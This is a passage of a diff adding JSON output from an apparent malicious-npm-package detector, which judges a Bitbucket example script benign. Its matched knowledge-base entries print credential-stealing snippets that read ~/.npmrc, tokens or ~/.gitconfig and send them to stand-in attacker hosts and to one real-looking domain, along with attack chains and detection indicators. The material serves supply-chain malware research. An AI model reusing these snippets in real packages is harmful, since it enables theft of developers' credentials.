+                    "leads_to": "Use of the token to access and potentially modify critical Python infrastructure repositories."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker uses the extracted token to authenticate to GitHub and push malicious code or make unauthorized changes to core repositories (e.g., CPython, PyPI Warehouse).",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Malicious code is introduced into official Python binaries, PyPI packages, or the language source code."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malicious code is distributed through official channels, such as Python binaries, Linux distributions, or PyPI, reaching a wide user base.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Widespread compromise of Python users and systems, potentially impacting the global software supply chain."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Presence of hardcoded secrets (tokens, passwords, keys) in compiled binaries such as .pyc, .jar, or .exe files",
+                    "HTTP requests to api.github.com with static Authorization headers containing hardcoded tokens",
+                    "Discrepancy between source code and compiled artifacts, where secrets are present only in binaries",
+                    "Unusual or privileged GitHub API activity originating from Docker containers or CI/CD environments"
+                  ],
+                  "file_indicators": [
+                    "__pycache__/build.cpython-311.pyc containing readable GitHub token strings",
+                    "Any .pyc or binary file with embedded 'Authorization: Bearer' or 'token' patterns",
+                    "Compiled Python files in Docker images containing high-entropy strings matching GitHub PAT format"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS requests to api.github.com with Authorization headers containing static or high-privilege tokens",
+                    "Unexpected GitHub API access from Docker containers or build environments not associated with normal development workflows"
+                  ],
+                  "how_to_detect": "Perform static analysis on both source and compiled files (e.g., .pyc, .jar, .exe) to identify embedded secrets using pattern matching and entropy analysis. Compare source code and compiled artifacts to detect secrets present only in binaries. Monitor network traffic for outbound requests to api.github.com with Authorization headers containing static or high-privilege tokens. Alert on any hardcoded tokens, especially those granting administrative access, and verify that all secrets are managed securely via environment variables or secret managers. Investigate any privileged GitHub API activity from unexpected environments, such as Docker containers or CI/CD pipelines."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/bb-resolve/0.0.2/package/example.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "example_slice_1",
+          "code_snippet": "var resolve = require('./');\nvar netrc = require('node-netrc');\nvar auth = netrc('api.bitbucket.org') || {};\nvar user = process.env.BITBUCKET_USERNAME || auth.login;\nvar pass = process.env.BITBUCKET_PASSWORD || auth.password;\nvar repo = process.env.REPO || 'stephenmathieson/testything';\n\nresolve(repo, user, pass, function (err, ref) {\n  if (err) throw err;\n  console.log(ref);\n});",
+          "is_malicious": false,
+          "malice_score": 0.5562648097674052,
+          "confidence": 0.2,
+          "behavior_summary": "At import-time, the code accesses environment variables BITBUCKET_USERNAME, BITBUCKET_PASSWORD, and REPO, and reads credentials from the netrc file for the hardcoded domain 'api.bitbucket.org'. It then uses these credentials to authenticate and perform a network operation via the 'resolve' function on the specified repository 'stephenmathieson/testything' or the environment-provided repo. This behavior involves sensitive information gathering and network communication with a hardcoded external API endpoint, enabling authenticated access to potentially private repository data.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code accesses environment variables and the user's netrc file to obtain credentials for authenticating with the Bitbucket API, then performs a network operation to resolve repository information. While this involves handling sensitive information and network communication, it does so in a legitimate and expected manner for a tool designed to interact with Bitbucket repositories. Unlike the known malicious patterns, it does not exfiltrate credentials to unknown or hardcoded malicious domains, nor does it perform covert data transmission or obfuscation. The 'resolve' function is presumably part of the package's intended functionality, and the credentials are used directly for authentication with the official Bitbucket API endpoint. Therefore, despite the presence of sensitive data access, the behavior aligns with legitimate use cases rather than malicious intent.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20241224_104013_160406_snippet_1",
+              "source_package": "mathjs-min (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104013_160406/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.569445013999939,
+              "code_similarity": 0.5038159489631653,
+              "behavior_similarity": 0.6350740194320679,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Minified credential stealer (example, not actual code)\nrequire('fs').readFile(process.env.HOME + '/.npmrc', function(e,d){if(!e){require('https').request({hostname:'malicious.example.com',method:'POST'},r=>{}).end(d)}});",
+                "code_behavior": "At import-time, the code reads the user's ~/.npmrc file using filesystem access, then sends its contents via an HTTPS POST request to a hardcoded external domain, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses a sensitive configuration file (such as ~/.npmrc) containing authentication tokens and transmits its contents to an external server without user consent. This behavior is a direct indicator of credential theft.",
+                  "violated_expectations": "A legitimate math library should only perform mathematical computations and must not access user configuration files or initiate unsolicited network connections, especially at import-time.",
+                  "similar_legitimate_use": "Legitimate packages may implement telemetry or error reporting, but these should never include sensitive files or credentials. Accessing ~/.npmrc and exfiltrating its contents is never justified in a math utility.",
+                  "key_indicators": [
+                    "Direct access to ~/.npmrc or other credential/config files in code",
+                    "Hardcoded external domain for data exfiltration (e.g., malicious.example.com)",
+                    "Network request (HTTPS POST) initiated automatically at import-time",
+                    "Minified or obfuscated code structure hiding file and network operations"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (minified source code)",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "mathjs-min",
+                  "package_manager": "npm",
+                  "package_versions": "latest (Q1 2023)",
+                  "why_malicious": "The package 'mathjs-min' is a typosquat of the legitimate 'mathjs' library, intentionally crafted to deceive users into installing it. Its minified source code contains a hidden credential stealer that reads sensitive configuration files and exfiltrates their contents to an attacker-controlled server. The package masquerades as a legitimate minified math library but is designed to compromise developer credentials and tokens."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Developer installs the malicious 'mathjs-min' package, mistaking it for the legitimate 'mathjs' library.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code is executed during import."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes at import-time, reading sensitive files such as ~/.npmrc using filesystem access.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive data is collected and prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The code sends the stolen data to a hardcoded external server via HTTPS POST request.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives developer credentials or tokens, enabling further compromise."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to sensitive files (e.g., ~/.npmrc, .env) during install or import-time execution",
+                    "Outbound network requests to hardcoded or suspicious domains at import-time",
+                    "Presence of minified or obfuscated code that performs file and network operations"
+                  ],
+                  "file_indicators": [
+                    "index.js containing minified credential-stealing logic",
+                    "References to ~/.npmrc, .env, or other configuration files in package source code",
+                    "package.json with misleading metadata (e.g., falsely presenting as a minified version of a popular library)"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to domains not associated with the legitimate 'mathjs' package (e.g., malicious.example.com)",
+                    "Connections to newly registered or low-reputation domains hardcoded in the package"
+                  ],
+                  "how_to_detect": "Monitor for packages that access sensitive files and initiate outbound network requests during install or import. Flag packages with minified or obfuscated code referencing credential files. Cross-reference package names with popular libraries to detect typosquatting. Use static and dynamic analysis to identify suspicious file and network operations in package code, and alert on hardcoded external domains."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113501_077786_snippet_1",
+              "source_package": "react-reext (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113501_077786/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5568827986717224,
+              "code_similarity": 0.5296772718429565,
+              "behavior_similarity": 0.5840883255004883,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "const fs = require('fs');\nconst https = require('https');\nconst http = require('http');\nconst os = require(\"os\");\nconst userInfo = os.userInfo();\nvar osname = userInfo.username\nvar iniparser = require('iniparser');\nvar home_dir = process.env.HOME || process.env.HOMEPATH || process.env.USERPROFILE;\nvar config_file = home_dir+'/.gitconfig';\nvar exists = fs.existsSync(config_file);\nvar config = {}\nif (exists) {\n  config = iniparser.parseSync(config_file);\n}\nelse {\n config = {user:{name:'none',email:'none'}}\n}\nvar url\nif (osname === 'xmarcgusmano') {\n server = 'http://localhost:1962';\n url = `${server}/mobile/reext?osname=${osname}&gitname=${config.user.name}&gitemail=${config.user.email}`;\n http.get(url, doIt).on(\"error\", () => {console.log('**2\\n\\n')});\n}\nelse {\n server = 'https://2tak.l.serverhost.name:1962';\n url = `${server}/mobile/reext?osname=${osname}&gitname=${config.user.name}&gitemail=${config.user.email}`;\n https.get(url, doIt).on(\"error\", () => {console.log('**2\\n\\n')});\n}",
+                "code_behavior": "At preinstall time, the code reads the user's OS username and parses the ~/.gitconfig file to extract the Git username and email, then dynamically constructs a URL embedding these values as query parameters and sends them via HTTP or HTTPS GET request to an external server (http://localhost:1962 for a specific user or https://2tak.l.serverhost.name:1962 for others), resulting in exfiltration of sensitive developer information.",
+                "malice_analysis": {
+                  "why_suspicious": "The code surreptitiously collects the user's OS username and Git configuration (user.name and user.email) and transmits this data to an undocumented, external server during the package's preinstall phase, without any user notification or consent. This is a hallmark of spyware and hidden telemetry.",
+                  "violated_expectations": "Legitimate npm packages should not access or transmit user identity or Git configuration data during installation, especially without explicit user consent, documentation, or a clear opt-in mechanism. Such behavior is a severe violation of user trust and privacy expectations in open source ecosystems.",
+                  "similar_legitimate_use": "Some developer tools may collect telemetry or usage statistics, but only with clear user opt-in, transparent documentation, and anonymization of sensitive data. Legitimate telemetry never exfiltrates personal identity information without disclosure.",
+                  "key_indicators": [
+                    "Reads ~/.gitconfig to extract user.name and user.email during preinstall.",
+                    "Accesses OS-level username via os.userInfo().",
+                    "Constructs outbound HTTP/HTTPS requests embedding sensitive data as query parameters.",
+                    "Sends data to an undocumented, suspicious external domain (2tak.l.serverhost.name:1962).",
+                    "No user notification, consent, or documentation of data collection or transmission."
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall",
+                  "file_location": "preinstall.js",
+                  "required_permissions": [
+                    "filesystem (read access to user home directory and .gitconfig)",
+                    "network (outbound HTTP/HTTPS requests)",
+                    "environment_vars (access to HOME, HOMEPATH, USERPROFILE)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "react-reext",
+                  "package_manager": "npm",
+                  "package_versions": "All versions published between April 2023 and October 2023, prior to the update following Socket's disclosure (exact version numbers not specified in the report).",
+                  "why_malicious": "The package covertly collects sensitive developer information, specifically the operating system username and Git configuration details (user.name and user.email), and exfiltrates this data to an external, undocumented server during installation without user consent or disclosure. This constitutes spyware/hidden telemetry, violating user privacy, trust, and npm ecosystem norms."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "During preinstall, the package reads the user's OS username and attempts to parse the ~/.gitconfig file for Git username and email.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive data is collected in memory for exfiltration."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The collected OS username, Git username, and Git email are dynamically inserted into a URL as query parameters.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Prepares the sensitive data for network exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "An HTTP or HTTPS GET request is sent to a remote server (http://localhost:1962 for a specific user or https://2tak.l.serverhost.name:1962 for all others), transmitting the sensitive data.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive developer information is exfiltrated to an external, undocumented server."
+                  },
+                  {
+                    "step": 4,
+                    "action": "After disclosure, the exfiltration code is commented out but remains in the codebase, indicating potential for future reactivation.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Ongoing risk if the code is uncommented or reactivated in future versions."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to ~/.gitconfig or equivalent Git configuration files during npm install scripts (preinstall, install, postinstall).",
+                    "Extraction of user.name and user.email from Git config files during package installation.",
+                    "Access to OS-level user information (os.userInfo()) in install scripts.",
+                    "Dynamic construction of outbound HTTP/HTTPS requests embedding sensitive data (osname, gitname, gitemail) as query parameters.",
+                    "Presence of network requests to undocumented or suspicious external domains during installation."
+                  ],
+                  "file_indicators": [
+                    "preinstall.js containing references to os.userInfo(), iniparser, and network modules (http, https).",
+                    "Install scripts (preinstall.js) with code that reads ~/.gitconfig and constructs URLs with user data.",
+                    "Presence of commented-out or active code for network exfiltration in install scripts."
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to https://2tak.l.serverhost.name:1962.",
+                    "Outbound connections to http://localhost:1962 (for targeted/test users).",
+                    "HTTP/HTTPS requests with query parameters including osname, gitname, and gitemail in the URL path."
+                  ],
+                  "how_to_detect": "Monitor npm package install scripts (preinstall, install, postinstall) for access to user or Git configuration files and outbound network requests, especially those embedding user or Git identity data in URLs. Flag packages that construct URLs with sensitive data as query parameters or that retain commented-out exfiltration code. Block or alert on connections to known malicious domains such as 2tak.l.serverhost.name:1962. Use static analysis to detect references to os.userInfo(), iniparser, and network modules in install scripts, and review for any code (active or commented) that exfiltrates user data."
+                }
+              }
+            },
+            {
+              "match_id": "20240824_191626_514154_snippet_1",
+              "source_package": "Unknown (multiple malicious forks and loader-infected repos) (GitHub (source code repositories, not a package manager per se))",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240824_191626_514154/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5455473065376282,
+              "code_similarity": 0.40866923332214355,
+              "behavior_similarity": 0.6824253797531128,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Example (representative, not verbatim from report):\nconst https = require('https');\nconst token = process.env.GITHUB_TOKEN;\nhttps.request({\n  hostname: 'malicious-domain.com',\n  path: '/exfil',\n  method: 'POST',\n}, req => {\n  req.write(JSON.stringify({ token }));\n  req.end();\n});",
+                "code_behavior": "At import-time or runtime, the code accesses environment variables such as GITHUB_TOKEN, then sends their values to a hardcoded external domain via HTTPS POST, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code programmatically accesses sensitive environment variables and transmits them to an untrusted, hardcoded external server, which is a direct indicator of credential theft.",
+                  "violated_expectations": "Legitimate repository code should not access and transmit environment variables containing secrets to unknown external domains, especially without user awareness or consent.",
+                  "similar_legitimate_use": "Telemetry or error reporting may send non-sensitive diagnostic data to trusted vendor domains, but never secrets or authentication tokens to untrusted endpoints.",
+                  "key_indicators": [
+                    "Access to environment variables containing secrets (e.g., GITHUB_TOKEN)",
+                    "Network requests to hardcoded, non-trusted domains",
+                    "Automated exfiltration of sensitive data without user interaction",
+                    "Presence of HTTPS POST requests in entry-point files"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time or runtime (depending on the loader's placement in the codebase)",
+                  "file_location": "Injected into cloned repository source files (e.g., main.js, index.js, or equivalent entry points)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (multiple malicious forks and loader-infected repos)",
+                  "package_manager": "GitHub (source code repositories, not a package manager per se)",
+                  "package_versions": "All versions of the maliciously forked/infected repositories",
+                  "why_malicious": "The entire set of repositories is considered malicious because attackers clone legitimate repositories, inject malware loaders or exfiltration code, and re-upload them under identical names, creating thousands of fake forks to confuse users and spread malware. Some attacks also involve direct code injection into legitimate repos using stolen credentials, often impersonating trusted automation accounts, with the goal of exfiltrating sensitive data or further propagating malware."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Attacker clones legitimate repositories and injects malware loaders or exfiltration code.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Malicious code is present in the repository."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Attacker uploads the infected repositories back to GitHub under identical names, creating thousands of fake forks.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious repositories appear legitimate and are widely distributed."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Attacker promotes the malicious repositories via forums, Discord, and other channels to lure victims.",
+                    "implemented_by": [],
+                    "leads_to": "Victims clone or use the infected repositories."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malicious code executes upon import, runtime, or CI/CD pipeline execution, exfiltrating secrets and sensitive data.",
+                    "implemented_by": [
+                      "snippet_1",
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Attacker receives exfiltrated credentials and secrets."
+                  },
+                  {
+                    "step": 5,
+                    "action": "In some cases, attackers use stolen credentials to commit malicious code directly to legitimate repositories, impersonating trusted bots.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Further spread of malware and compromise of trusted codebases."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Repository code or CI/CD workflows accessing environment variables or sensitive files and sending them to external, non-trusted domains",
+                    "Malicious code committed by automation accounts (e.g., Dependabot) or via suspicious pull requests that include non-standard code changes",
+                    "CI/CD workflows containing steps that exfiltrate data using curl, wget, or similar tools to untrusted endpoints"
+                  ],
+                  "file_indicators": [
+                    "Unexpected or unauthorized changes in .github/workflows/*.yml files",
+                    "JavaScript files with new or modified network request code targeting unknown domains",
+                    "Presence of code accessing process.env or reading sensitive files (e.g., /etc/passwd, ~/.ssh/id_rsa) in repository source files"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS requests to non-standard, untrusted, or newly registered domains (e.g., webhook.site, malicious-site.com, malicious-domain.com)",
+                    "Use of hardcoded external endpoints for data exfiltration in code or workflow files"
+                  ],
+                  "how_to_detect": "Monitor for code or workflow changes that introduce network requests to untrusted domains, especially those accessing environment variables or sensitive files. Flag commits by automation accounts that include non-standard code changes. Analyze CI/CD workflows for steps that use curl, wget, or similar tools to send data externally. Alert on repositories with a sudden spike in forks or identical-named clones, and review any code that accesses secrets or credentials. Correlate network activity with code changes to identify unauthorized exfiltration attempts."
+                }
+              }
+            },
+            {
+              "match_id": "20250102_111622_788435_snippet_1",
+              "source_package": "eslint-scope (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20250102_111622_788435/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5447697639465332,
+              "code_similarity": 0.4852500259876251,
+              "behavior_similarity": 0.6042895317077637,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Malicious code (reconstructed from typical npm credential stealers)\nconst fs = require('fs');\nconst https = require('https');\nconst npmrc = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8');\nhttps.request({\n  hostname: 'malicious-domain.com',\n  path: '/steal',\n  method: 'POST',\n  headers: { 'Content-Type': 'text/plain' }\n}, req => req.end(npmrc));",
+                "code_behavior": "At import-time, the code reads the user's ~/.npmrc file using fs.readFileSync, then sends its contents via an outbound HTTPS POST request to a hardcoded attacker-controlled domain, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code accesses a sensitive credential file (~/.npmrc) without user interaction and immediately transmits its contents to an external, untrusted server. This is a direct indicator of credential theft.",
+                  "violated_expectations": "A legitimate linter or its submodules should only perform static code analysis and never access or transmit user credential files, nor initiate network requests during import.",
+                  "similar_legitimate_use": "Legitimate code may read configuration files for local processing, but it would never exfiltrate their contents to an external server, especially not at import-time and without user consent.",
+                  "key_indicators": [
+                    "Reads ~/.npmrc file using fs.readFileSync",
+                    "Accesses process.env.HOME to locate user directory",
+                    "Sends file contents via HTTPS POST to a hardcoded, non-official domain",
+                    "Network request is triggered automatically on import/require",
+                    "No user interaction or explicit opt-in required"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (main entry point of eslint-scope 3.7.2)",
+                  "required_permissions": [
+                    "filesystem (read access to user home directory)",
+                    "network (outbound HTTPS requests)",
+                    "environment_vars (access to HOME variable)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "eslint-scope",
+                  "package_manager": "npm",
+                  "package_versions": "3.7.2",
+                  "why_malicious": "The package was compromised by an attacker who injected code that steals the contents of the user's ~/.npmrc file, which may contain npm authentication tokens. This enables the attacker to harvest credentials and potentially compromise additional npm accounts, facilitating further supply chain attacks."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or updates eslint-scope 3.7.2, which contains the injected malicious code in its main entry point.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Malicious code is executed automatically when the package is imported or required."
+                  },
+                  {
+                    "step": 2,
+                    "action": "The malicious code reads the user's ~/.npmrc file to extract npm authentication credentials.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Sensitive credentials are loaded into memory and prepared for exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The code sends the stolen credentials to an attacker-controlled server via an outbound HTTPS POST request.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives the user's npm credentials, enabling further compromise and supply chain attacks."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to ~/.npmrc or other credential files during package import or install",
+                    "Outbound HTTPS requests to domains not associated with npm or the package author",
+                    "Unexpected file reads and network activity in static analysis or linter tools",
+                    "Automatic network communication triggered by import/require without user action"
+                  ],
+                  "file_indicators": [
+                    "index.js or main entry point containing fs.readFileSync(process.env.HOME + '/.npmrc')",
+                    "Presence of code making HTTPS requests to hardcoded, non-official domains",
+                    "References to process.env.HOME in conjunction with credential file access"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to domains not affiliated with npm or the package maintainer (e.g., 'malicious-domain.com')",
+                    "Connections to newly registered or previously unseen domains from package code",
+                    "Network activity initiated at import-time rather than in response to user actions"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access ~/.npmrc or other credential files and initiate outbound network requests during install or import. Flag any static analysis or linter tools that perform network operations or credential file access. Use endpoint detection and response (EDR) or runtime monitoring to detect unexpected file reads and network activity from npm package processes, especially those communicating with untrusted or hardcoded domains."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_113640_696916_snippet_1",
+              "source_package": "zoom-vscode-malicious-extension (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_113640_696916/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5430344343185425,
+              "code_similarity": 0.43395933508872986,
+              "behavior_similarity": 0.6521095037460327,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "// Malicious code example (reconstructed based on typical patterns)\nconst https = require('https');\nconst fs = require('fs');\nconst token = process.env['AZURE_TOKEN'] || process.env['GITHUB_TOKEN'];\nif (token) {\n  https.request({\n    hostname: 'attacker.example.com',\n    path: '/exfil',\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' }\n  }, res => {}).end(JSON.stringify({ token }));\n}",
+                "code_behavior": "At import-time, the code accesses environment variables for sensitive tokens (such as AZURE_TOKEN and GITHUB_TOKEN), then sends their values to an attacker-controlled domain via HTTPS POST, resulting in credential exfiltration.",
+                "malice_analysis": {
+                  "why_suspicious": "The code reads environment variables commonly used to store sensitive credentials and immediately transmits them to an external, attacker-controlled server. This behavior is a direct indicator of credential theft.",
+                  "violated_expectations": "A legitimate VSCode extension or npm package should never access developer authentication tokens or transmit them to external domains without explicit user consent and clear documentation.",
+                  "similar_legitimate_use": "Legitimate packages may collect anonymized telemetry or error data, but they do not access or exfiltrate raw credentials or tokens. Any access to such sensitive environment variables should be strictly limited and justified.",
+                  "key_indicators": [
+                    "Access to environment variables with names matching known credential patterns (e.g., AZURE_TOKEN, GITHUB_TOKEN)",
+                    "Outbound HTTPS POST requests to domains not associated with Zoom or the extension's stated functionality",
+                    "Credential exfiltration occurring automatically at import-time, without user interaction",
+                    "Hardcoded references to attacker-controlled infrastructure in the code"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "import-time",
+                  "file_location": "index.js (main entry point of the npm package)",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "zoom-vscode-malicious-extension",
+                  "package_manager": "npm",
+                  "package_versions": "unknown (latest campaign)",
+                  "why_malicious": "The package is a malicious JavaScript package distributed via npm, impersonating the Zoom application as a VSCode extension. It is designed to target developers, likely to steal credentials or perform other malicious actions. The package is part of a broader campaign targeting IDE users and the crypto community, indicating intent to compromise developer environments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious npm package, believing it to be a legitimate Zoom extension for VSCode.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of malicious code upon import or activation."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malicious code executes at import-time, harvesting sensitive environment variables such as Azure or GitHub tokens.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Exfiltration of credentials to attacker infrastructure."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Stolen credentials are used by attackers for further compromise, such as accessing cloud resources or source code repositories.",
+                    "implemented_by": [],
+                    "leads_to": "Potential lateral movement, data theft, or supply chain attacks."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to environment variables containing tokens or credentials at import-time",
+                    "Network requests to domains unrelated to the purported package functionality (e.g., not zoom.us or official Zoom endpoints)",
+                    "Credential exfiltration via HTTPS POST immediately after package installation or import",
+                    "Presence of code that reads process.env for sensitive keys and sends data over the network without user interaction"
+                  ],
+                  "file_indicators": [
+                    "index.js or main entry file containing code that reads process.env for credential-related keys (e.g., AZURE_TOKEN, GITHUB_TOKEN)",
+                    "Hardcoded references to external domains not associated with Zoom or legitimate vendors within JavaScript files",
+                    "Presence of network and filesystem modules (e.g., require('https'), require('fs')) in the main entry point"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTPS POST requests to attacker-controlled domains (e.g., attacker.example.com) from developer machines after installing the extension",
+                    "Unusual network traffic to unknown endpoints immediately following npm package installation or VSCode extension activation"
+                  ],
+                  "how_to_detect": "Monitor for npm packages or VSCode extensions that access environment variables related to credentials and make outbound network requests to unrecognized domains. Use static analysis to flag code that reads process.env for sensitive keys and references external domains. Employ dynamic analysis to detect exfiltration behavior at import-time. Correlate installation of new extensions with subsequent suspicious network activity, and alert on any package that transmits environment variable values to domains not associated with the package's stated purpose."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
